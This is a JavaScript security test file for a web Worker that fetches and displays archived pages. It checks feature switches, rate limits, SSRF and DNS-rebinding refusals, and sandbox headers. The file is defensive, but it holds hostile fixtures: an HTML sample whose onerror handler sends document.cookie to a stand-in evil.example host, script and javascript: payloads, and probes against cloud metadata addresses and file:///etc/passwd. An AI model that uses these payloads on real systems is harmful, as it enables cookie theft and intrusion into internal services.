// Stage 0 security acceptance tests for the Worker (docs/STAGE0_SECURITY.md). Deterministic: every upstream (archives,
// websites, DNS-over-HTTPS) is a stub, so no test touches a real host and none generates load. The handlers are
// called exactly as the Worker calls them, so a request that skips the page's own user interface is the normal case.
import test from 'node:test';
import assert from 'node:assert/strict';
import { FEATURE_VARS, TEST_ONLY_VARS, configProblems, featureEffective, publicFeatures, featureGate, callerAllowed, limitsFor, aiRouteGuard, acquireSlot, _inflightForTests, isTestMode } from '../src/guard.js';
import { handleFetch, handleCaptures, handleFeatures, dnsVerdict } from '../src/discoveryProxy.js';
import { handleViewCapture, CSP_SANDBOX } from '../src/viewCapture.js';
import { isKnownArchiveHost } from '../src/archive.js';

// ---------- fixtures ----------
const NativeRequest = globalThis.Request;
function req(url, { site = 'same-origin', dest = 'empty', headers = {}, method = 'GET', body } = {}) {
  const h = new Headers(headers);
  if (site) h.set('sec-fetch-site', site);
  if (dest) h.set('sec-fetch-dest', dest);
  return new NativeRequest(url, { method, headers: h, body });
}
function withCaches() {
  const store = new Map();
  globalThis.caches = { default: { match: async (r) => { const v = store.get(r.url); return v ? v.clone() : undefined; }, put: async (r, res) => { store.set(r.url, res.clone()); } } };
  return store;
}
const baseEnv = (extra = {}) => ({ ENVIRONMENT: 'staging', FEATURE_DISCOVERY_FETCH: 'on', FEATURE_DISCOVERY_CAPTURES: 'on', FEATURE_VIEW_CAPTURE: 'on', FEATURE_ASK_SOURCES: 'on', AI_ENABLED: 'on', AI_PER_VISITOR_PER_DAY: '3', AI_DAILY_CEILING: '5', ...extra });
const doh = (map) => async (url) => {
  if (!url.includes('cloudflare-dns.com')) return null;
  const u = new URL(url); const name = u.searchParams.get('name'); const type = u.searchParams.get('type');
  const rows = (map[name] || []).filter((r) => (type === 'A' ? !r.includes(':') : r.includes(':')));
  return new Response(JSON.stringify({ Status: 0, Answer: rows.map((data) => ({ name, type: type === 'A' ? 1 : 28, data })) }), { headers: { 'content-type': 'application/dns-json' } });
};
const upstreamStub = (dnsMap, pages = {}) => async (url, init) => {
  const d = await doh(dnsMap)(url, init); if (d) return d;
  const u = new URL(url);
  if (u.pathname === '/robots.txt') return new Response('User-agent: *\nAllow: /\n', { status: 200 });
  const p = pages[u.pathname];
  if (p === 'hang') return new Promise((_, rej) => init?.signal?.addEventListener('abort', () => rej(Object.assign(new Error('aborted'), { name: 'AbortError' }))));
  if (typeof p === 'function') return p(url, init);
  return new Response(p ?? 'ok', { status: 200, headers: { 'content-type': 'text/plain' } });
};
const PUBLIC = { 'records.example.gov': ['93.184.216.34'] };

// ---------- switches and configuration ----------
test('every network-facing route answers 404 unless its switch is exactly "on" (a hidden button enables nothing)', async () => {
  withCaches();
  for (const value of [undefined, 'off', 'ON', 'On', 'true', '1', 'yes', ' on', 'on ', '']) {
    const env = baseEnv({ FEATURE_DISCOVERY_FETCH: value, FEATURE_DISCOVERY_CAPTURES: value, FEATURE_VIEW_CAPTURE: value, FEATURE_ASK_SOURCES: value, AI_ENABLED: value });
    if (value === undefined) { for (const v of Object.values(FEATURE_VARS)) delete env[v]; }
    assert.equal((await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/x'), env, { fetchImpl: upstreamStub(PUBLIC) })).status, 404, `fetch with ${JSON.stringify(value)}`);
    assert.equal((await handleCaptures(req('http://w/api/captures?url=https://records.example.gov/x'), env, { fetchImpl: upstreamStub(PUBLIC) })).status, 404);
    assert.equal((await handleViewCapture(req('http://w/api/view-capture?url=https://web.archive.org/web/2024/https://x.gov/'), env, {}, { fetchImpl: upstreamStub({}) })).status, 404);
    assert.equal((await aiRouteGuard(req('http://w/api/analyze/qualitative', { method: 'POST', headers: { 'content-length': '10' } }), env, 'qualitative')).status, 404);
    assert.equal((await aiRouteGuard(req('http://w/api/analyze/ask-sources', { method: 'POST', headers: { 'content-length': '10' } }), env, 'ask-sources')).status, 404);
  }
});
test('each switch is independent', async () => {
  withCaches();
  const only = (name) => { const e = baseEnv(); for (const v of Object.values(FEATURE_VARS)) e[v] = 'off'; e[name] = 'on'; return e; };
  const f = (env) => handleFetch(req('http://w/api/fetch?url=https://records.example.gov/x&ack=1&seed=1'), env, { fetchImpl: upstreamStub(PUBLIC) });
  assert.equal((await f(only('FEATURE_DISCOVERY_CAPTURES'))).status, 404);
  assert.equal((await f(only('FEATURE_VIEW_CAPTURE'))).status, 404);
  assert.equal((await f(only('FEATURE_DISCOVERY_FETCH'))).status, 200);
  assert.deepEqual(publicFeatures(only('FEATURE_VIEW_CAPTURE')), { discoveryFetch: false, discoveryCaptures: false, viewCapture: true, askSources: false, ai: false });
});
test('a switched-off feature refuses direct requests even with perfect browser headers (not just a hidden interface)', async () => {
  withCaches();
  const env = baseEnv({ FEATURE_DISCOVERY_FETCH: 'off' });
  const r = await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/doc.pdf&ack=1&seed=1', { headers: { origin: 'http://w', referer: 'http://w/' } }), env, { fetchImpl: async () => { throw new Error('must not be called'); } });
  assert.equal(r.status, 404);
});
test('production-like configuration: test-only variables make every guarded feature refuse (503), and they grant nothing', async () => {
  withCaches();
  for (const v of TEST_ONLY_VARS) {
    const env = baseEnv({ ENVIRONMENT: 'production', [v]: v === 'TEST_MODE' ? 'on' : '1' });
    assert.ok(configProblems(env).length, `${v} must be a problem in production`);
    assert.equal((await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/x'), env, { fetchImpl: upstreamStub(PUBLIC) })).status, 503, v);
    assert.equal((await handleCaptures(req('http://w/api/captures?url=https://records.example.gov/x'), env)).status, 503);
    // The capture viewer is never available in a production environment at all (404), which is checked before the unsafe-configuration 503.
    assert.equal((await handleViewCapture(req('http://w/api/view-capture?url=https://web.archive.org/web/2024/x'), env, {})).status, 404);
    assert.equal((await aiRouteGuard(req('http://w/x', { method: 'POST', headers: { 'content-length': '5' } }), env, 'qualitative')).status, 503);
    assert.equal(featureEffective(env, 'discoveryFetch'), false);
  }
  const env = baseEnv({ ENVIRONMENT: 'production', DISCOVERY_ALLOW_PRIVATE: '127.0.0.1:8790' });
  assert.equal(isTestMode(env), false);
  assert.equal((await handleFetch(req('http://w/api/fetch?url=http://127.0.0.1:8790/x&ack=1'), env, { fetchImpl: upstreamStub({}) })).status, 503, 'private hosts are not exempted in production');
});
test('an unset ENVIRONMENT is treated as production', async () => {
  const env = baseEnv(); delete env.ENVIRONMENT;
  assert.ok(configProblems(env).some((p) => /ENVIRONMENT is not set/.test(p)));
  assert.equal((await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/x'), env)).status, 503);
  const withTest = baseEnv({ TEST_MODE: 'on' }); delete withTest.ENVIRONMENT;
  assert.equal(isTestMode(withTest), false);
});
test('paid AI is unavailable unless BOTH cost ceilings are valid whole numbers', async () => {
  withCaches();
  const post = () => req('http://w/api/analyze/qualitative', { method: 'POST', headers: { 'content-length': '100' } });
  for (const bad of [{}, { AI_DAILY_CEILING: undefined }, { AI_PER_VISITOR_PER_DAY: undefined }, { AI_DAILY_CEILING: '0' }, { AI_PER_VISITOR_PER_DAY: '-3' }, { AI_DAILY_CEILING: 'many' }, { AI_PER_VISITOR_PER_DAY: '2.5' }]) {
    const env = baseEnv(bad); if (!Object.keys(bad).length) { delete env.AI_PER_VISITOR_PER_DAY; delete env.AI_DAILY_CEILING; }
    assert.equal((await aiRouteGuard(post(), env, 'qualitative')).status, 404, JSON.stringify(bad));
    assert.equal(featureEffective(env, 'ai'), false);
  }
  assert.equal(await aiRouteGuard(post(), baseEnv(), 'qualitative'), null, 'configured and on: allowed through to the handler');
  assert.equal((await aiRouteGuard(post(), baseEnv({ AI_ENABLED: 'off' }), 'ask-sources')).status, 404, 'Ask Sources needs the AI switch too');
});
test('/api/features returns booleans only and never a variable value or a secret', async () => {
  const env = baseEnv({ ANTHROPIC_API_KEY: 'sk-ant-SECRET-VALUE', FOO: 'bar' });
  const body = await handleFeatures(req('http://w/api/features'), env).text();
  assert.ok(!/SECRET|sk-ant|bar|staging/.test(body), body);
  assert.deepEqual(Object.keys(JSON.parse(body).features).sort(), ['ai', 'askSources', 'discoveryCaptures', 'discoveryFetch', 'viewCapture']);
  assert.ok(Object.values(JSON.parse(body).features).every((v) => typeof v === 'boolean'));
});

// ---------- who may call ----------
test('direct calls that are not this site\'s own browser pages are refused', async () => {
  withCaches();
  const env = baseEnv({ ALLOWED_EXTENSION_ORIGINS: 'chrome-extension://abcdefghijklmnopabcdefghijklmnop' });
  const f = (opts) => handleFetch(req('http://w/api/fetch?url=https://records.example.gov/x&ack=1&seed=1', opts), env, { fetchImpl: upstreamStub(PUBLIC) });
  assert.equal((await f({ site: null })).status, 403, 'no Sec-Fetch-Site (curl, scripts)');
  for (const site of ['cross-site', 'same-site', 'none']) assert.equal((await f({ site })).status, 403, site);
  assert.equal((await f({ site: 'same-origin' })).status, 200);
  assert.equal((await f({ site: 'cross-site', headers: { origin: 'chrome-extension://abcdefghijklmnopabcdefghijklmnop' } })).status, 403, 'the extension may not use the fetch proxy');
  const c = (opts) => handleCaptures(req('http://w/api/captures?url=https://records.example.gov/x', opts), env, { fetchImpl: async () => new Response(JSON.stringify({ archived_snapshots: {} })) });
  assert.equal((await c({ site: 'cross-site', headers: { origin: 'chrome-extension://abcdefghijklmnopabcdefghijklmnop' } })).status, 200, 'the named extension may look up archived copies');
  assert.equal((await c({ site: 'cross-site', headers: { origin: 'chrome-extension://ponmlkjihgfedcbaponmlkjihgfedcba' } })).status, 403, 'another extension may not');
  assert.equal((await c({ site: 'cross-site', headers: { origin: 'https://evil.example' } })).status, 403);
  assert.equal(callerAllowed(req('http://w/x', { site: 'cross-site', headers: { origin: 'chrome-extension://abc' } }), { ALLOWED_EXTENSION_ORIGINS: 'chrome-extension://abc' }, { allowExtension: true }), false, 'malformed extension ids are never allowed');
  const noEnvList = baseEnv(); delete noEnvList.ALLOWED_EXTENSION_ORIGINS;
  assert.equal(callerAllowed(req('http://w/x', { site: 'cross-site', headers: { origin: 'chrome-extension://abcdefghijklmnopabcdefghijklmnop' } }), noEnvList, { allowExtension: true }), false, 'no configured extension: none allowed');
});

// ---------- limits ----------
test('rate limits are counted by the Worker: per visitor, per site, per day; and they only ever go down in production', async () => {
  withCaches();
  const env = baseEnv({ LIMIT_FETCH_PER_IP_PER_MIN: '3' });
  const call = (ip = '203.0.113.7', url = 'https://records.example.gov/x') => handleFetch(req(`http://w/api/fetch?url=${url}&ack=1&seed=1`, { headers: { 'cf-connecting-ip': ip } }), env, { fetchImpl: upstreamStub(PUBLIC) });
  const codes = []; for (let i = 0; i < 5; i++) codes.push((await call()).status);
  assert.deepEqual(codes, [200, 200, 200, 429, 429], 'the fourth call from one visitor is refused');
  assert.equal((await call('203.0.113.8')).status, 200, 'another visitor is not affected');
  assert.equal(limitsFor(baseEnv({ LIMIT_FETCH_PER_IP_PER_MIN: '100000' }), 'fetch').perIpPerMin, 30, 'an environment value cannot RAISE a production limit');
  assert.equal(limitsFor(baseEnv({ LIMIT_FETCH_PER_IP_PER_MIN: '5' }), 'fetch').perIpPerMin, 5);
  assert.equal(limitsFor(baseEnv({ LIMIT_FETCH_PER_IP_PER_MIN: 'abc' }), 'fetch').perIpPerMin, 30);
  assert.equal(limitsFor(baseEnv({ TEST_LIMIT_OVERRIDES: JSON.stringify({ fetch: { perIpPerMin: 9999 } }) }), 'fetch').perIpPerMin, 30, 'test overrides are ignored outside test mode');
  withCaches();
  const siteEnv = baseEnv({ LIMIT_FETCH_PER_SITE_PER_MIN: '2' });
  const s = []; for (let i = 0; i < 4; i++) s.push((await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/x&ack=1&seed=1', { headers: { 'cf-connecting-ip': `198.51.100.${i}` } }), siteEnv, { fetchImpl: upstreamStub(PUBLIC) })).status);
  assert.deepEqual(s, [200, 200, 429, 429], 'many visitors cannot hammer one site');
  withCaches();
  const dayEnv = baseEnv({ LIMIT_FETCH_GLOBAL_PER_DAY: '2' });
  const d = []; for (let i = 0; i < 4; i++) d.push((await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/x&ack=1&seed=1', { headers: { 'cf-connecting-ip': `198.51.100.${i}`, } }), { ...dayEnv, LIMIT_FETCH_PER_SITE_PER_MIN: '1000' }, { fetchImpl: upstreamStub(PUBLIC) })).status);
  assert.deepEqual(d, [200, 200, 503, 503], 'the daily ceiling answers "unavailable today"');
});
test('FAIL CLOSED: if limit storage is missing or broken, the request is refused, not allowed', async () => {
  const env = baseEnv();
  delete globalThis.caches;
  assert.equal((await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/x&ack=1&seed=1'), env, { fetchImpl: upstreamStub(PUBLIC) })).status, 503);
  assert.equal((await handleCaptures(req('http://w/api/captures?url=https://records.example.gov/x'), env)).status, 503);
  assert.equal((await handleViewCapture(req('http://w/api/view-capture?url=https://web.archive.org/web/2024/x'), env, {})).status, 503);
  assert.equal((await aiRouteGuard(req('http://w/x', { method: 'POST', headers: { 'content-length': '5' } }), env, 'qualitative')).status, 503);
  globalThis.caches = { default: { match: async () => { throw new Error('storage down'); }, put: async () => { throw new Error('storage down'); } } };
  assert.equal((await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/x&ack=1&seed=1'), env, { fetchImpl: upstreamStub(PUBLIC) })).status, 503);
  assert.equal((await handleCaptures(req('http://w/api/captures?url=https://records.example.gov/x'), env)).status, 503);
});
test('concurrency: slots are limited per route, released on success, failure and timeout', async () => {
  withCaches();
  _inflightForTests.clear();
  const env = baseEnv({ LIMIT_FETCH_MAX_CONCURRENT: '2', DISCOVERY_UPSTREAM_TIMEOUT_MS: '200', TEST_MODE: 'on', TEST_SKIP_DNS_CHECK: 'on', LIMIT_FETCH_PER_IP_PER_MIN: '30' });
  const gate = {}; gate.p = new Promise((r) => { gate.open = r; });
  const slow = upstreamStub(PUBLIC, { '/slow': async () => { await gate.p; return new Response('done'); } });
  const call = (p, ip) => handleFetch(req(`http://w/api/fetch?url=https://records.example.gov${p}&ack=1&seed=1`, { headers: { 'cf-connecting-ip': ip } }), env, { fetchImpl: slow });
  const a = call('/slow', '10.1.1.1'); const b = call('/slow', '10.1.1.2');
  await new Promise((r) => setTimeout(r, 30));
  const c = await call('/slow', '10.1.1.3');
  assert.equal(c.status, 429); assert.equal((await c.json()).error, 'busy');
  gate.open();
  assert.equal((await a).status, 200); assert.equal((await b).status, 200);
  assert.equal(_inflightForTests.get('fetch'), 0, 'slots released after success');
  const hang = upstreamStub(PUBLIC, { '/hang': 'hang' });
  const t0 = Date.now();
  const timedOut = await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/hang&ack=1&seed=1', { headers: { 'cf-connecting-ip': '10.2.2.2' } }), env, { fetchImpl: hang });
  assert.equal(timedOut.status, 504); assert.ok(Date.now() - t0 < 2000, 'a hanging upstream is cut off by the timeout');
  assert.equal(_inflightForTests.get('fetch'), 0, 'slots released after a timeout');
  const boom = upstreamStub(PUBLIC, { '/boom': () => { throw new Error('network'); } });
  assert.equal((await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/boom&ack=1&seed=1', { headers: { 'cf-connecting-ip': '10.3.3.3' } }), env, { fetchImpl: boom })).status, 504);
  assert.equal(_inflightForTests.get('fetch'), 0, 'slots released after an error');
  const r1 = acquireSlot('x', 1); assert.ok(r1); assert.equal(acquireSlot('x', 1), null); r1(); r1(); assert.ok(acquireSlot('x', 1), 'releasing twice does not free two slots');
});
test('oversized documents are cut at the server\'s limit and marked, whatever the page asked for', async () => {
  withCaches();
  const env = baseEnv({ LIMIT_FETCH_MAX_BYTES: '4096', TEST_MODE: 'on', TEST_SKIP_DNS_CHECK: 'on' });
  const big = upstreamStub(PUBLIC, { '/big.pdf': () => new Response(new Uint8Array(100_000).fill(65), { headers: { 'content-type': 'application/pdf' } }), '/lie.pdf': () => new Response(new Uint8Array(100_000).fill(66), { headers: { 'content-type': 'application/pdf', 'content-length': '10' } }) });
  const r = await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/big.pdf&ack=1&seed=1', { headers: { 'cf-connecting-ip': '10.4.4.4' } }), env, { fetchImpl: big });
  assert.equal(r.status, 200); assert.equal(r.headers.get('x-chronium-truncated'), '1'); assert.equal((await r.arrayBuffer()).byteLength, 4096);
  assert.equal(limitsFor(baseEnv({ LIMIT_FETCH_MAX_BYTES: '999999999' }), 'fetch').maxBytes, 10 * 1024 * 1024, 'the cap cannot be raised by configuration');
});
test('responses never carry cookies and always carry isolation headers; blocked content types are refused', async () => {
  withCaches();
  const env = baseEnv({ TEST_MODE: 'on', TEST_SKIP_DNS_CHECK: 'on' });
  const pages = { '/a.html': () => new Response('<script>alert(1)</script>', { headers: { 'content-type': 'text/html', 'set-cookie': 'sid=1; Path=/' } }), '/pic.png': () => new Response('x', { headers: { 'content-type': 'image/png' } }) };
  const r = await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/a.html&ack=1&seed=1', { headers: { 'cf-connecting-ip': '10.5.5.5' } }), env, { fetchImpl: upstreamStub(PUBLIC, pages) });
  assert.equal(r.headers.get('set-cookie'), null); assert.equal(r.headers.get('content-security-policy'), 'sandbox'); assert.equal(r.headers.get('x-content-type-options'), 'nosniff'); assert.equal(r.headers.get('access-control-allow-origin'), null);
  assert.equal((await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/pic.png&ack=1&seed=1', { headers: { 'cf-connecting-ip': '10.5.5.6' } }), env, { fetchImpl: upstreamStub(PUBLIC, pages) })).status, 415);
});

// ---------- redirects, private networks, DNS ----------
test('the proxy never follows a redirect: the caller gets the 3xx and the (resolved) destination, and must ask again for each hop', async () => {
  withCaches();
  const env = baseEnv({ TEST_MODE: 'on', TEST_SKIP_DNS_CHECK: 'on' });
  let followed = 0;
  const pages = { '/r': () => new Response(null, { status: 302, headers: { location: 'http://169.254.169.254/latest/meta-data/' } }), '/meta': () => { followed++; return new Response('secret'); } };
  const r = await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/r&ack=1&seed=1', { headers: { 'cf-connecting-ip': '10.6.6.6' } }), env, { fetchImpl: upstreamStub(PUBLIC, pages) });
  assert.equal(r.headers.get('x-chronium-status'), '302'); assert.equal(r.headers.get('x-chronium-location'), 'http://169.254.169.254/latest/meta-data/'); assert.equal(followed, 0);
  const hop = await handleFetch(req('http://w/api/fetch?url=http://169.254.169.254/latest/meta-data/&ack=1&seed=1', { headers: { 'cf-connecting-ip': '10.6.6.7' } }), env, { fetchImpl: upstreamStub(PUBLIC, pages) });
  assert.equal(hop.status, 400, 'the next hop to a private address is refused when the page asks for it');
});
test('private and unsafe addresses are refused in every spelling, without any upstream call', async () => {
  withCaches();
  const env = baseEnv();
  let calls = 0; const spy = async () => { calls++; return new Response('x'); };
  for (const u of ['http://127.0.0.1/', 'http://localhost/', 'http://[::1]/', 'http://10.0.0.1/', 'http://192.168.1.1/', 'http://169.254.169.254/', 'http://2130706433/', 'http://0x7f.1/', 'http://[::ffff:7f00:1]/', 'http://metadata.google.internal/', 'ftp://records.example.gov/', 'https://user:pw@records.example.gov/', 'https://records.example.gov:8443/', 'file:///etc/passwd']) {
    const r = await handleFetch(req(`http://w/api/fetch?url=${encodeURIComponent(u)}&ack=1&seed=1`, { headers: { 'cf-connecting-ip': '10.7.7.7' } }), { ...env, LIMIT_FETCH_PER_IP_PER_MIN: '1000' }, { fetchImpl: spy });
    assert.equal(r.status, 400, u);
  }
  assert.equal(calls, 0);
});
test('DNS: a public name that resolves to a private address is refused, including on a later hop after the answer changed (rebinding)', async () => {
  const store = withCaches();
  const env = baseEnv({ LIMIT_FETCH_PER_IP_PER_MIN: '1000', LIMIT_FETCH_PER_SITE_PER_MIN: '1000' });
  const map = { 'records.example.gov': ['93.184.216.34'], 'evil.example.gov': ['10.0.0.5'], 'evil6.example.gov': ['fd00::1'], 'mixed.example.gov': ['93.184.216.34', '169.254.169.254'], 'v6ok.example.gov': ['2606:2800:220:1::1'], 'nowhere.example.gov': [], 'loop.example.gov': ['127.0.0.1'], 'mapped.example.gov': ['::ffff:7f00:1'] };
  const calls = []; const f = async (url, init) => { calls.push(url); return upstreamStub(map)(url, init); };
  const ask = (host) => handleFetch(req(`http://w/api/fetch?url=https://${host}/doc&ack=1&seed=1`, { headers: { 'cf-connecting-ip': '10.8.8.8' } }), env, { fetchImpl: f });
  assert.equal((await ask('records.example.gov')).status, 200);
  assert.equal((await ask('v6ok.example.gov')).status, 200);
  for (const bad of ['evil.example.gov', 'evil6.example.gov', 'mixed.example.gov', 'loop.example.gov', 'mapped.example.gov']) { const r = await ask(bad); assert.equal(r.status, 400, bad); assert.equal((await r.json()).reason, 'private-address'); }
  assert.equal((await ask('nowhere.example.gov')).status, 400, 'a name with no address is refused');
  assert.ok(!calls.some((u) => /evil|loop|mixed|mapped/.test(u) && !u.includes('cloudflare-dns.com')), 'no request was ever sent to a name that resolves privately');
  // rebinding: the name was public, then changes to a private address after the cached answer expires
  map['rebind.example.gov'] = ['93.184.216.34'];
  assert.equal((await ask('rebind.example.gov')).status, 200);
  map['rebind.example.gov'] = ['10.0.0.9'];
  for (const k of [...store.keys()]) if (k.includes('/dns/')) store.delete(k);
  assert.equal((await ask('rebind.example.gov')).status, 400, 'the second hop sees the new, private answer');
});
test('DNS: if the resolver cannot be reached the request fails closed', async () => {
  withCaches();
  const env = baseEnv({ LIMIT_FETCH_PER_IP_PER_MIN: '1000' });
  const down = async (url) => { throw new Error('resolver down'); };
  const r = await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/x&ack=1&seed=1', { headers: { 'cf-connecting-ip': '10.9.9.9' } }), env, { fetchImpl: down });
  assert.equal(r.status, 503); assert.equal((await r.json()).error, 'dns-unavailable');
  const bad = async () => new Response('nope', { status: 500 });
  assert.equal((await dnsVerdict('records.example.gov', env, bad)).reason, 'dns-unavailable');
});
test('policy-blocked hosts are refused on the server even with ack=1 (Copperas Cove, CivicPlus, EMMA)', async () => {
  withCaches();
  const env = baseEnv({ LIMIT_FETCH_PER_IP_PER_MIN: '1000' });
  let calls = 0; const spy = async () => { calls++; return new Response('x'); };
  for (const h of ['www.copperascovetx.gov', 'copperascovetx.gov', 'civicplus.com', 'x.civicplus.com', 'emma.msrb.org']) {
    const r = await handleFetch(req(`http://w/api/fetch?url=https://${h}/AgendaCenter&ack=1&seed=1`, { headers: { 'cf-connecting-ip': '10.10.10.10' } }), env, { fetchImpl: spy });
    assert.equal(r.status, 403, h);
  }
  assert.equal(calls, 0, 'nothing was sent anywhere, not even a DNS question');
});

// ---------- archived content (view-capture) ----------
const HOSTILE = '<!doctype html><html><head><title>x</title></head><body><script>parent.__pwned=1;indexedDB.open("chronium")</script><img src=x onerror="fetch(\'//evil.example/?\'+document.cookie)"><iframe src="javascript:alert(1)"></iframe></body></html>';
const archiveStub = (pages) => async (url, init) => { const u = new URL(url); const p = pages[u.hostname + u.pathname] || pages[u.pathname]; if (typeof p === 'function') return p(url, init); return p ? new Response(p.body ?? p, { status: p.status || 200, headers: p.headers || { 'content-type': 'text/html' } }) : new Response('not found', { status: 404 }); };
const vc = (url, opts, env = baseEnv(), pages = {}) => handleViewCapture(req(`http://w/api/view-capture?url=${encodeURIComponent(url)}${opts?.download ? '&download=1' : ''}`, { dest: opts && 'dest' in opts ? opts.dest : 'empty', site: opts?.site === undefined ? 'same-origin' : opts.site, headers: { 'cf-connecting-ip': opts?.ip || '192.0.2.50' } }), env, { waitUntil() {} }, { fetchImpl: archiveStub(pages) });
test('malicious archived HTML is served only with sandbox isolation headers (scripts cannot run with access to the app origin)', async () => {
  withCaches();
  const pages = { 'web.archive.org/web/20240101000000if_/https://x.gov/': { body: HOSTILE, headers: { 'content-type': 'text/html' } } };
  const r = await vc('https://web.archive.org/web/20240101000000/https://x.gov/', {}, baseEnv({ LIMIT_VIEWCAPTURE_PER_IP_PER_MIN: undefined }), pages);
  assert.equal(r.status, 200);
  const csp = r.headers.get('content-security-policy'); assert.equal(csp, CSP_SANDBOX); assert.match(csp, /(^|;)\s*sandbox\s*(;|$)/); assert.doesNotMatch(csp, /allow-scripts|allow-same-origin/);
  assert.equal(r.headers.get('x-content-type-options'), 'nosniff'); assert.equal(r.headers.get('referrer-policy'), 'no-referrer'); assert.equal(r.headers.get('cross-origin-resource-policy'), 'same-origin');
  assert.match(csp, /default-src 'none'/); assert.match(csp, /frame-ancestors 'self'/); assert.match(csp, /form-action 'none'/);
  assert.match(await r.text(), /<base href=/, 'content is passed through as data, with only the base tag added');
});
test('every response of the archive viewer, errors included, carries isolation headers; scriptable types get sandbox', async () => {
  withCaches();
  const types = { 'text/html': true, 'application/xhtml+xml': true, 'image/svg+xml': true, 'text/xml': true, 'application/xml': true, 'application/pdf': false, 'text/plain': false, 'image/png': false, 'application/json': false };
  let n = 0;
  for (const [type, sandboxed] of Object.entries(types)) {
    const pages = { [`web.archive.org/web/20240101000000if_/https://x.gov/f${n}`]: { body: '<svg onload="alert(1)"></svg>', headers: { 'content-type': type } } };
    const r = await vc(`https://web.archive.org/web/20240101000000/https://x.gov/f${n}`, { ip: `192.0.2.${100 + n++}` }, baseEnv(), pages);
    assert.equal(r.status, 200, type); const csp = r.headers.get('content-security-policy');
    assert.equal(/(^|;)\s*sandbox\s*(;|$)/.test(csp), sandboxed, `${type}: ${csp}`); assert.equal(r.headers.get('x-content-type-options'), 'nosniff');
  }
  const odd = await vc('https://web.archive.org/web/20240101000000/https://x.gov/g', { ip: '192.0.2.200' }, baseEnv(), { 'web.archive.org/web/20240101000000if_/https://x.gov/g': { body: 'MZ', headers: { 'content-type': 'application/x-msdownload' } } });
  assert.equal(odd.status, 415); assert.match(odd.headers.get('content-security-policy'), /sandbox/);
  const missing = await vc('https://web.archive.org/web/20240101000000/https://x.gov/none', { ip: '192.0.2.201' }, baseEnv(), {});
  assert.equal(missing.status, 502); assert.match(missing.headers.get('content-security-policy'), /sandbox/);
});
test('the archive viewer cannot be opened by navigation, in a frame, or by a non-browser; downloads are attachments', async () => {
  withCaches();
  const pages = { 'web.archive.org/web/20240101000000if_/https://x.gov/': { body: HOSTILE, headers: { 'content-type': 'text/html' } }, 'web.archive.org/web/20240101000000/https://x.gov/': { body: HOSTILE, headers: { 'content-type': 'text/html' } } };
  const u = 'https://web.archive.org/web/20240101000000/https://x.gov/';
  let i = 0;
  for (const dest of ['document', 'iframe', 'frame', 'object', 'embed', 'script', 'style', 'image', null]) assert.equal((await vc(u, { dest, ip: `192.0.2.${i++}` }, baseEnv(), pages)).status, 403, `view mode with dest ${dest}`);
  assert.equal((await vc(u, { site: null, ip: '192.0.2.60' }, baseEnv(), pages)).status, 403, 'no Sec-Fetch-Site');
  assert.equal((await vc(u, { site: 'cross-site', ip: '192.0.2.61' }, baseEnv(), pages)).status, 403);
  const dl = await vc(u, { download: true, dest: 'document', ip: '192.0.2.62' }, baseEnv(), pages);
  assert.equal(dl.status, 200); assert.match(dl.headers.get('content-disposition'), /^attachment;/); assert.match(dl.headers.get('content-security-policy'), /sandbox/);
  assert.equal((await vc(u, { download: true, dest: 'iframe', ip: '192.0.2.63' }, baseEnv(), pages)).status, 403, 'a download cannot be shown in a frame');
});
test('archive viewer: only archive hosts; every redirect destination is re-checked; private and unapproved destinations are refused', async () => {
  withCaches();
  const env = baseEnv();
  let ip = 0; const call = (url, pages) => vc(url, { ip: `192.0.2.${10 + ip++}` }, env, pages);
  assert.equal((await call('https://evil.example/page', {})).status, 400);
  assert.equal((await call('https://web.archive.org.evil.example/page', {})).status, 400, 'suffix tricks');
  assert.equal((await call('http://127.0.0.1/x', {})).status, 400);
  assert.equal(isKnownArchiveHost('https://notweb.archive.org.evil.com/'), false); assert.equal(isKnownArchiveHost('https://web.archive.org/'), true);
  const hits = []; const spy = (name, body) => (url) => { hits.push(name); return new Response(body, { headers: { 'content-type': 'text/plain' } }); };
  const redirect = (to) => ({ status: 302, headers: { location: to } });
  const pg = (to) => ({ 'web.archive.org/web/20240101000000if_/https://x.gov/a': () => new Response(null, redirect(to)) });
  assert.equal((await call('https://web.archive.org/web/20240101000000/https://x.gov/a', { ...pg('http://169.254.169.254/latest/meta-data/'), '169.254.169.254/latest/meta-data/': spy('meta', 'secret') })).status, 403, 'redirect to a private address');
  assert.equal((await call('https://web.archive.org/web/20240101000000/https://x.gov/a', { ...pg('https://evil.example/steal'), 'evil.example/steal': spy('evil', 'x') })).status, 403, 'redirect to an unapproved host');
  assert.equal((await call('https://web.archive.org/web/20240101000000/https://x.gov/a', { ...pg('https://web.archive.org.evil.example/'), 'web.archive.org.evil.example/': spy('suffix', 'x') })).status, 403);
  assert.equal((await call('https://web.archive.org/web/20240101000000/https://x.gov/a', { ...pg('ftp://web.archive.org/x') })).status, 403, 'redirect to another scheme');
  assert.deepEqual(hits, [], 'no request was sent to any refused destination');
  const loop = { 'web.archive.org/web/20240101000000if_/https://x.gov/a': () => new Response(null, redirect('https://web.archive.org/web/20240101000000if_/https://x.gov/b')), 'web.archive.org/web/20240101000000if_/https://x.gov/b': () => new Response(null, redirect('https://web.archive.org/web/20240101000000if_/https://x.gov/c')), 'web.archive.org/web/20240101000000if_/https://x.gov/c': () => new Response(null, redirect('https://web.archive.org/web/20240101000000if_/https://x.gov/d')), 'web.archive.org/web/20240101000000if_/https://x.gov/d': () => new Response(null, redirect('https://web.archive.org/web/20240101000000if_/https://x.gov/e')), 'web.archive.org/web/20240101000000if_/https://x.gov/e': () => new Response('too far', { headers: { 'content-type': 'text/plain' } }) };
  assert.equal((await call('https://web.archive.org/web/20240101000000/https://x.gov/a', loop)).status, 403, 'more than three hops');
